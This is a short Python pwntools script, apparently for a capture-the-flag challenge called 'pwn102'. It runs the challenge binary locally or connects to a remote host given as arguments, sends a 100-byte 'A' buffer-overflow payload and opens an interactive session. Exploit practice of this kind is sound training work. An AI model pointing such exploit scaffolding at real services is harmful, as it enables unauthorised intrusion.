#!/usr/bin/env python

import sys
from pwn import *
from struct import *

exe = './pwn102.pwn102'
context.binary = ELF(exe,checksec=False)

def start(argv=[], *a, **kw):
        if args.REMOTE: # Runs on remote server, usage "python2.7 code.py REMOTE ip port"
                return remote(sys.argv[1], sys.argv[2], *a, **kw)
        else: # Runs locally, usage "python2.7 code.py"
                return process([exe] + argv, *a, **kw)

exploit  = b''
exploit += b"A"*100


io = start()
io.sendline(exploit)
io.interactive()
